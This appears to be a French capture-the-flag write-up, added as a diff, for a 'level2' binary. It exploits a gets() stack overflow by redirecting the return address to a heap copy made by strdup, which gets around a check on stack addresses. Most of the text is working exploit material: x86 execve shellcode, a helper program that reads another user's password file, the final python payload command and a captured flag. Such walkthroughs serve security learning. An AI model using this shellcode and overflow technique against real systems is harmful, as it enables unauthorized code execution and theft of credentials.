@@ -1,0 +1,52 @@
+===================================================================
+ref shellcode: https://dhavalkapil.com/blogs/Shellcode-Injection/
+\x2f\x67\x65\x74	/get
+\x2f\x74\x6d\x70	/tmp
+
+Code source de /tmp/get:
+	#include <stdio.h>
+	#include <stdlib.h>
+	void main()
+	{
+		system("cat /home/user/level3/.pass");
+	}
+===================================================================
+
+Le programme utilise la fonction gets qui n'est pas secure, tout ce qui sera lu sera copié dans le buffer.
+	0x080484ed <+25>:    call   0x80483c0 <gets@plt>
+
+On peut donc overflow et changer l'adresse de retour de la fonction (cf image.png),
+pour la faire pointer dans notre buffer et y executer notre shellcode qui executera le binaire /tmp/get:
+	nop:	\x90 * 30
+	\x31\xc0\x50\x68\x2f\x67\x65\x74\x68\x2f\x74\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 BBBB\x1c\xa0\x04\x08
+	fill:	A * 21
+	ebp:	BBBB
+	return:	\xf0\xf6\xff\xbf	# on jump sur l'adresse du buffer + 20dec pour tomber au milieu des nop (\x90)
+
+Cela aurait pu marcher si le programme n'etait pas protégé. Il verifie que l'adresse de retour ne se trouve pas sur la stack: 0xb-------
+	0x080484f2 <+30>:    mov    0x4(%ebp),%eax
+	0x080484f5 <+33>:    mov    %eax,-0xc(%ebp)
+	0x080484f8 <+36>:    mov    -0xc(%ebp),%eax
+	0x080484fb <+39>:    and    $0xb0000000,%eax
+	0x08048500 <+44>:    cmp    $0xb0000000,%eax
+
+On peut voir qu'il utilise strdup, probablement pour copier le buffer quelquepart:
+	0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
+
+Avec gdb on break juste apres, et on obtient cette adresse sur la heap:
+	(gdb) x $eax
+	0x804a008:   [...]
+
+On peut donc y envoyer le retour de la fonction:
+	nop:	\x90 * 30
+	\x31\xc0\x50\x68\x2f\x67\x65\x74\x68\x2f\x74\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80 BBBB\x1c\xa0\x04\x08
+	fill:	A * 21
+	ebp:	BBBB
+	return:	\x1c\xa0\x04\x08	# 0x804a01c = 0x804a008 + 20, offset pour tomber dans les nop (\x90)
+
+Commandes finale:
+	$ python -c 'print "\x90"*30 + "\x31\xc0\x50\x68\x2f\x67\x65\x74\x68\x2f\x74\x6d\x70\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" + "A"*21 + "BBBB\x1c\xa0\x04\x08"' > /tmp/exploit
+	$ ./level2 < /tmp/exploit
+	������������������������������1�Ph/geth/tmp��P��S��
+	̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀AAAAAAAAAAAAAAAAABBBB� ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀ ̀
+	492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
